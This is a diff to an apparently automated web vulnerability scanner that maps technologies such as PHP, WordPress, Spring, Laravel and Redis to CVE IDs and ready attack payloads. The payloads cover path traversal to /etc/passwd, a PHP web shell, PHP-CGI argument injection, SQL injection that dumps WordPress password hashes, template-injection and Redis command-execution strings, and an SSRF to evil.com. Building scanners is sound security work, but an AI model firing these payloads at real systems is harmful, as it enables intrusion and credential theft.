@@ -391,59 +391,64 @@ function deduplicateFindings(findings: Finding[]): Finding[] {
   return Array.from(seen.values());
 }
 
-// ===== CVE Mapping for Technologies =====
+// ===== Enhanced CVE Mapping for Technologies (expanded with latest CVEs) =====
 const TECH_CVE_MAP: Record<string, { cves: string[]; payloads: { type: string; payload: string }[] }> = {
   'apache': {
-    cves: ['CVE-2021-41773', 'CVE-2021-42013', 'CVE-2023-25690'],
+    cves: ['CVE-2021-41773', 'CVE-2021-42013', 'CVE-2023-25690', 'CVE-2024-38476'],
     payloads: [
       { type: 'traversal', payload: '/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd' },
       { type: 'traversal', payload: '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd' },
+      { type: 'ssrf', payload: '/proxy/unix:/tmp/test|http://127.0.0.1/' },
     ]
   },
   'nginx': {
-    cves: ['CVE-2021-23017', 'CVE-2019-20372'],
+    cves: ['CVE-2021-23017', 'CVE-2024-7347', 'CVE-2019-20372'],
     payloads: [
       { type: 'traversal', payload: '/..%2f..%2f..%2fetc/passwd' },
       { type: 'ssrf', payload: '/proxy/http://127.0.0.1:80/admin' },
     ]
   },
   'php': {
-    cves: ['CVE-2024-4577', 'CVE-2019-11043'],
+    cves: ['CVE-2024-4577', 'CVE-2019-11043', 'CVE-2024-2961'],
     payloads: [
       { type: 'cmdi', payload: '<?php system($_GET["cmd"]); ?>' },
       { type: 'lfi', payload: 'php://filter/convert.base64-encode/resource=index.php' },
+      { type: 'cmdi', payload: '-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' },
     ]
   },
   'wordpress': {
-    cves: ['CVE-2023-2982', 'CVE-2022-21661'],
+    cves: ['CVE-2023-2982', 'CVE-2024-27956', 'CVE-2024-2876', 'CVE-2022-21661'],
     payloads: [
       { type: 'sqli', payload: "' UNION SELECT 1,user_login,user_pass,4 FROM wp_users--" },
       { type: 'xss', payload: '<img src=x onerror=alert(document.domain)>' },
+      { type: 'sqli', payload: "wp-admin/admin-ajax.php?action=parse-media-shortcode&shortcode=[gallery%20ids=\"1 UNION SELECT 1,2,user_pass FROM wp_users--\"]" },
     ]
   },
   'node': {
-    cves: ['CVE-2023-32002', 'CVE-2022-32213'],
+    cves: ['CVE-2023-32002', 'CVE-2024-22019', 'CVE-2022-32213'],
     payloads: [
       { type: 'ssti', payload: '{{constructor.constructor("return this.process.env")()}}' },
       { type: 'ssrf', payload: 'http://[::1]:3000/admin' },
+      { type: 'traversal', payload: '/..%00/etc/passwd' },
     ]
   },
   'express': {
-    cves: ['CVE-2022-24999', 'CVE-2024-29041'],
+    cves: ['CVE-2024-29041', 'CVE-2022-24999'],
     payloads: [
       { type: 'traversal', payload: '..\\..\\..\\..\\etc\\passwd' },
       { type: 'xss', payload: '"><img/src=x onerror=alert(1)>' },
+      { type: 'ssrf', payload: '//evil.com' },
     ]
   },
   'tomcat': {
-    cves: ['CVE-2020-1938', 'CVE-2024-50379'],
+    cves: ['CVE-2020-1938', 'CVE-2024-50379', 'CVE-2024-21733'],
     payloads: [
       { type: 'traversal', payload: '/..;/manager/html' },
       { type: 'traversal', payload: '/%252e%252e/%252e%252e/etc/passwd' },
     ]
   },
   'spring': {
-    cves: ['CVE-2022-22965', 'CVE-2022-22963'],
+    cves: ['CVE-2022-22965', 'CVE-2022-22963', 'CVE-2024-22234'],
     payloads: [
       { type: 'ssti', payload: '${T(java.lang.Runtime).getRuntime().exec("id")}' },
       { type: 'cmdi', payload: 'class.module.classLoader.URLs%5B0%5D=0' },
@@ -454,6 +459,43 @@ const TECH_CVE_MAP: Record<string, { cves: string[]; payloads: { type: string; p
     payloads: [
       { type: 'traversal', payload: '/..%255c..%255c..%255cwindows/win.ini' },
       { type: 'xss', payload: '/%3Cscript%3Ealert(1)%3C/script%3E.aspx' },
+    ]
+  },
+  'jquery': {
+    cves: ['CVE-2020-11023', 'CVE-2019-11358'],
+    payloads: [
+      { type: 'xss', payload: '<option><style></option></select><img src=x onerror=alert(1)>' },
+    ]
+  },
+  'openssl': {
+    cves: ['CVE-2022-3602', 'CVE-2024-0727'],
+    payloads: []
+  },
+  'django': {
+    cves: ['CVE-2024-27351', 'CVE-2023-36053'],
+    payloads: [
+      { type: 'sqli', payload: "1' OR '1'='1" },
+      { type: 'ssti', payload: '{{request.META}}' },
+    ]
+  },
+  'flask': {
+    cves: ['CVE-2023-30861'],
+    payloads: [
+      { type: 'ssti', payload: '{{config.items()}}' },
+      { type: 'ssti', payload: "{{''.__class__.__mro__[1].__subclasses__()}}" },
+    ]
+  },
+  'laravel': {
+    cves: ['CVE-2021-3129'],
+    payloads: [
+      { type: 'rce', payload: '_ignition/execute-solution' },
+      { type: 'xss', payload: '<img src=x onerror=alert(document.cookie)>' },
+    ]
+  },
+  'redis': {
+    cves: ['CVE-2022-0543', 'CVE-2023-28856'],
+    payloads: [
+      { type: 'cmdi', payload: 'eval "return io.popen(\\"id\\"):read(\\"*a\\")" 0' },
     ]
   },
 };
